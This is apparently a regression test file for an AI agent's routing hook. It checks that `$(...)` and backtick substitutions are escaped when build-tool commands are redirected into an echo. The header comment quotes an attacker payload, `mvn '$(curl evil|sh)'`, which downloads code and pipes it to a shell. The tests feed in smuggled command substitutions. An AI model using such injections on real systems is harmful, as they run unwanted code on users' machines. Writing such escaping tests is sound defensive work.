/**
 * Regression: the build-tool redirect re-quotes the raw command into an executed
 * `echo`. Without escaping `$`/backtick, an attacker-authored `mvn '$(curl evil|sh)'`
 * (inert under its own single quotes) would have its substitution activated when
 * the redirect runs as permissionDecision:"allow".
 */
import { describe, test, beforeAll, afterAll } from "vitest";
import { strict as assert } from "node:assert";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";

let routePreToolUse: (
  toolName: string,
  toolInput: Record<string, unknown>,
) => { updatedInput?: Record<string, unknown> } | null;
let sentinelDir: string;

beforeAll(async () => {
  // The redirect (mcpRedirect) only fires when isMCPReady() is true.
  sentinelDir = mkdtempSync(join(tmpdir(), "ctx-redirect-sentinels-"));
  process.env.CONTEXT_MODE_MCP_SENTINEL_DIR = sentinelDir;
  writeFileSync(
    resolve(sentinelDir, `context-mode-mcp-ready-${process.pid}`),
    String(process.pid),
  );
  const mod = await import("../../hooks/core/routing.mjs");
  routePreToolUse = mod.routePreToolUse;
});

afterAll(() => {
  try {
    rmSync(sentinelDir, { recursive: true, force: true });
  } catch {
    /* ignore */
  }
  delete process.env.CONTEXT_MODE_MCP_SENTINEL_DIR;
});

describe("build-tool redirect neutralizes shell command substitution", () => {
  test("escapes $(...) so it cannot execute in the redirect echo", () => {
    const result = routePreToolUse("Bash", {
      command: "mvn '$(touch /tmp/ctx-pwned-marker)'",
    });
    assert.ok(result?.updatedInput, "expected a build-tool redirect (modify) result");
    const cmd = (result!.updatedInput as Record<string, string>).command;
    // No live `$(` may remain: every `$` must be backslash-escaped in the echo.
    assert.ok(!/(^|[^\\])\$\(/.test(cmd), `unescaped $( in redirect command: ${cmd}`);
    assert.ok(cmd.includes("\\$(touch"), `expected escaped \\$(touch in: ${cmd}`);
  });

  test("escapes backticks in the redirected command", () => {
    const result = routePreToolUse("Bash", { command: "gradle build `id`" });
    assert.ok(result?.updatedInput, "expected a build-tool redirect (modify) result");
    const cmd = (result!.updatedInput as Record<string, string>).command;
    assert.ok(!/(^|[^\\])`/.test(cmd), `unescaped backtick in redirect command: ${cmd}`);
  });
});
